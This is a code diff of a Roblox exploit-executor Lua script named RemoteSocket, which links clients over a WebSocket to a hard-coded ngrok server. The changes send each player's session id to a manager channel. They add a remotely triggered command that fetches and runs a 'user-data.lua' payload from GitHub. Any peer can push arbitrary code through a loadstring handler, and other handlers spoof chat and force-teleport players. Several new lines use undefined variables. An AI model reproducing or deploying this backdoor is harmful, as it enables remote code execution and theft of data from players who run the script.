@@ -10,18 +10,12 @@
 Beta 0.1
 ]]
 if getgenv().RemoteSocket then warn("Already Exist") return end
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Asepthegoat/LIUDEX-Z/refs/heads/main/script/tools/functions.lua"))() 
-getgenv().RemoteSocket = {
-    MainUrl = "",
-    Status = false,
-    Chat = false,
-    ClientId = getplayer().UserId,
-    RemoteCom = {} --just make this one empty dont fill it dude
-}
 
 --------------------------------------------------------------------
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Asepthegoat/LIUDEX-Z/refs/heads/main/script/tools/functions.lua"))() --LIB DON'T REMOVE THIS
 local rs = import.RunService
---LIB DON'T REMOVE THIS
+local Players = import.Players
+local HttpService = import.HttpService
 --[[
 work flow no nword count without skid gui
 ":;:" its used for invoke server
@@ -31,6 +25,7 @@ or you can use POST method to invoke server
 "FireSocket" used only for firing all client(reciver) to run code from sender and didnt affected annything on server
 
 --[DISCLAIMER]--
++ may i will use json later but for now im using url encode style
 + all string gsub function format is not from me it stolen from other script or chat gpt make it
     - lets improve this to together
 + it is recommended to add a prefix to your remote name, for example ldxbring instead of just bring.
@@ -44,13 +39,24 @@ or you can use POST method to invoke server
 [ Developed By Lorem Ipsum Familia Developer ]
 
 ]]
+getgenv().RemoteSocket = {
+    MainUrl = "",
+    Status = false,
+    Chat = false,
+    ClientId = getplayer().UserId,
+    RemoteCom = {} --just make this one empty dont fill it dude
+}
 local TextChatService = import.TextChatService
-function fakeChat(target,msg)
+local function fakeChat(target,msg)
     local plr = target
     local channel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
-    channel:DisplaySystemMessage('<font color="rgb(255,0,0)">' .. plr.Name .. ': </font>' .. msg)
-    local head = plr.Character
-    TextChatService:DisplayBubble(head, msg)
+    if plr == Players[plr.Name] then
+        channel:DisplaySystemMessage('<font color="rgb(255,0,0)">' .. plr.Name .. ': </font>' .. msg)
+        local ovhead = plr.Character
+        TextChatService:DisplayBubble(ovhead, msg)
+    else
+        channel:DisplaySystemMessage('<font color="rgb(80, 47, 201)">[Server]: </font>' .. msg)
+    end
 end
 
 if getgenv().RemoteSocket and getgenv().RemoteSocket.Status == true then
@@ -70,17 +76,17 @@ function Socket:SetMain(url)
         RemoteSocket.ClientId = getplayer().UserId
     end
 end
-
+Socket:SetMain("wss://xochitl-superexacting-unconcentrically.ngrok-free.dev")
 repeat
 task.wait(0.2)    
 until getgenv().RemoteSocket.MainUrl ~= ""
 
-local Players = import.Players
 local sockets = WebSocket.connect(RemoteSocket.MainUrl)
 sockets.OnClose:Connect(function()
     warn("Session Clossed")
+    sockets = WebSocket.connect()
 end)
-
+--[[
 sockets.OnMessage:Connect(function(msg)
     if not RemoteSocket.Status then
         RemoteSocket.Status = true
@@ -97,6 +103,11 @@ sockets.OnMessage:Connect(function(msg)
     local func =  RemoteSocket.RemoteCom[name].func or RemoteSocket.RemoteCom["entry"].func
     local argue = table.concat(args,",",4)
     local argument = string.split(argue,",",1)
+    for i,v in pairs(argument) do
+        if v:match("%$(.-)$") then
+            argument[i] = findPlayer(v:match("%$(.-)$")).Name
+        end
+    end
     local serverdata = args[3]:split(";")
     local job = serverdata[3]
     local place = serverdata[2]
@@ -107,8 +118,6 @@ sockets.OnMessage:Connect(function(msg)
     end
     if op == "@all" or op == "@global" then
         func(id,unpack(argument))
-    elseif import.Players[op:gsub("@","")] then
-        selfop = getplayer().Parent[op:gsub("@","")]
     elseif op:find("@server") then
         local serverdat = op:split(";")
         local place = serverdat[2]
@@ -116,6 +125,8 @@ sockets.OnMessage:Connect(function(msg)
         if tonumber(place) == game.PlaceId and jobid == game.JobId then
             func(id,unpack(argument))
         end
+    elseif import.Players[op:gsub("@","")] then
+        selfop = getplayer().Parent[op:gsub("@","")]
     end
     if selfop then
         if compareinstances(selfop, getplayer()) then
@@ -123,13 +134,57 @@ sockets.OnMessage:Connect(function(msg)
         end
     end
 end)
+]]
 
-if RemoteSocket.Chat then
-    getplayer().Chatted:Connect(function(msg)
-        local args = msg:split(" ")
-        Socket[args[1]]:FireSocket(table.concat(args," ",2))
-    end)
-end
+sockets.OnMessage:Connect(function(msg)
+    if not RemoteSocket.Status then
+        RemoteSocket.Status = true
+        print("Connected")
+    end
+    print("recive",msg)
+    if msg == "|ConnectedToSocket|" then
+        return
+    end
+    local args = HttpService:JSONDecode(msg)
+    local name = args['name']
+    local id = args['id']
+    local op = args['opr']
+    local func =  RemoteSocket.RemoteCom[name].func or RemoteSocket.RemoteCom["entry"].func
+    for i,v in pairs(args.args) do
+        if v:match("%$(.-)$") then
+            argument[i] = findPlayer(v:match("%$(.-)$")).Name
+        end
+    end
+    if op:lower() == "@manager" then
+        return
+    end
+    local serverdata = args['opr']:split(";")
+    local job = serverdata['opr']
+    local place = serverdata[2]
+    local selfop 
+    if args.name == "invoked" then
+        func = RemoteSocket.Invoker[name].func
+        func(unpack(args.args))
+    end
+    if op == "@all" or op == "@global" then
+        func(id,unpack(args.args))
+    elseif op:find("@server") then
+        local serverdat = op:split(";")
+        local place = serverdat[2]
+        local jobid = serverdat[3]
+        if tonumber(place) == game.PlaceId and jobid == game.JobId then
+            func(id,unpack(args.args))
+        end
+    elseif import.Players[op:gsub("@","")] then
+        selfop = getplayer().Parent[op:gsub("@","")]
+    end
+    if selfop then
+        if compareinstances(selfop, getplayer()) then
+            func(id,unpack(args.args))
+        end
+    end
+end)
+
 
 function Socket:CloseSession()
     sockets:Close()
@@ -153,22 +208,7 @@ function Socket.new(name,func)
     error("name must be string")
 end
 
-function Socket.request(name,call)
-    if name and typeof(name) == "string" then
-        if not RemoteSocket.Invoker[name] then
-            local remote = {}
-            remote.Id = RemoteSocket.ClientId
-            remote.Name = name
-            remote.func = func
-            setmetatable(remote,{__index = Socket})
-            RemoteSocket.Invoker[name] = remote
-            return RemoteSocket.Invoker[name]
-        end
-        return error(name .. "is alread exist")
-    end
-    error("name must be string")
-end
-
+--[[
 function Socket:FireSocket(op,...)
     local args = {...}
     for i,v in pairs(args) do
@@ -188,12 +228,53 @@ function Socket:FireSocket(op,...)
     local value = self.Name .. " | " .. tostring(self.Id) .. " | "  .. op .. " | " ..table.concat(args,",",1)
     sockets:Send(value)
 end
+]]
+
+function Socket:FireSocket(op,...)
+    local args = {...}
+    for i,v in pairs(args) do
+        if v == "@self" then
+            v = getplayer().Name
+        end
+    end
+
+    if op == "@server" then
+        op = op .. ";" .. game.PlaceId .. ";" .. game.JobId
+    elseif op == "@self" then
+        op = "@" .. getplayer().Name
+    elseif op:match("%$(.-)$") then
+        local partial = op:match("%$(.-)$")
+        op = findPlayer(partial).Name
+    end
+    local value = {name = self.Name,id = tostring(self.Id), opr = op, args = {unpack(args)}}
+    sockets:Send(HttpService:JSONEncode(value))
+end
 
 Socket.FireServer = Socket.FireSocket
 
+function Socket.newChannel(call)
+    local name = uid()
+    if name and typeof(name) == "string" then
+        if not RemoteSocket.Invoker[name] then
+            local remote = {}
+            remote.Id = RemoteSocket.ClientId
+            remote.Name = name
+            remote.func = func
+            setmetatable(remote,{__index = Socket})
+            RemoteSocket.Invoker[name] = remote
+            return RemoteSocket.Invoker[name]
+        end
+        return error(name .. "is alread exist")
+    end
+    error("name must be string")
+end
+
+getgenv().getSocketVersion = Socket.newChannel()
+
+
 function Socket:InvokeServer(remote,client,...)
     local args = {...}
-    local value = "Invoked" .. ":;:" .. self.Name .. ":;:"  .. tostring(client) .. ":;:" ..table.concat(args," ",1)
+    local value = "Invoke" .. ":;:" .. "&" .. self.Name .. "&" .. ":;:"  .. tostring(client) .. ":;:" ..table.concat(args," ",1)
     sockets:Send(value)
 end
 
@@ -207,7 +288,7 @@ local say = Socket.new("say",function(...)
 end)
 
 --require entry dont change annything here
-getgenv().ldxcode = Socket.new("code",function(id,sync,...) --its global so all script can use this
+getgenv().ldxcode = Socket.new("code",function(id,...) --its global so all script can use this
     local l = {...}
     local code = table.concat(l,"\n",1)
     loadstring(code)()
@@ -223,7 +304,7 @@ end)
 
 local attach = false
 local attachkey 
-function deattachplr()
+local function deattachplr()
     if typeof(attachkey) == "Instance" then
         attachkey:Destroy()
     elseif attachkey ~= nil then
@@ -243,15 +324,6 @@ getgenv().followtarget = Socket.new("follow",function(id,type,target,attached)
                 hrp.CFrame = hrp2.CFrame
             end)
             attach = true
-        elseif type == "weld" then
-            hrp.CFrame = hrp2.CFrame
-            task.wait()
-            local s = Instance.new("Weld")
-            s.Parent = getchar()
-            s.Part0 = hrp
-            s.Part1 = hrp2
-            attach = true
-            attachkey = s
         elseif type == "follow" then
             attachkey = import.RunService.Heartbeat:Connect(function()
                 getchar().Humanoid:MoveTo(hrp2.Position)
@@ -265,11 +337,11 @@ end)
 
 getgenv().chat = Socket.new("chat",function(id,...) 
     local args = {...}
-    local sender = Players:GetPlayerByUserId(tonumber(id))
+    local sender = Players:GetPlayerByUserId(tonumber(id)) or "Server"
     fakeChat(sender,table.concat(args," ",1))
 end)
 
-entry:FireSocket("@all","Hello everyone my name is " .. getplayer().Name)
+entry:FireSocket("@manager",getplayer().Name,tostring(getsessionid()))
 
 getgenv().ldxbring = Socket.new("Bring",function(id,target)
     if Players[target].Character then
@@ -295,6 +367,10 @@ getgenv().ldxAnnouncement = Socket.new("Announce",function(id,...)
     ldx:Announcement("Announcement",table.concat(args," ",1))
 end)
 
+getgenv().SendWebhookData = Socket.new("SendWebhookData",function(id,...)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Asepthegoat/LIUDEX-Z/refs/heads/main/script/tools/user-data.lua"))()
+end)
+
 getgenv().ldxhopto = Socket.new("hopto", function(id,goal,place,jobid)
     id = tonumber(id)
     jobid = jobid or "0"
@@ -310,6 +386,10 @@ getgenv().ldxhopto = Socket.new("hopto", function(id,goal,place,jobid)
     if goal == "GoTo" and id ~= getplayer().UserId and place ~= 0 and jobid ~= "0" then
         import.TeleportService:TeleportToPlaceInstance(tonumber(place),jobid,getplayer())
     end
+end)
+
+getgenv().UpdateClient = Socket.new("UpdateClient",function(id,...)
+    return nil
 end)
 
 return sockets
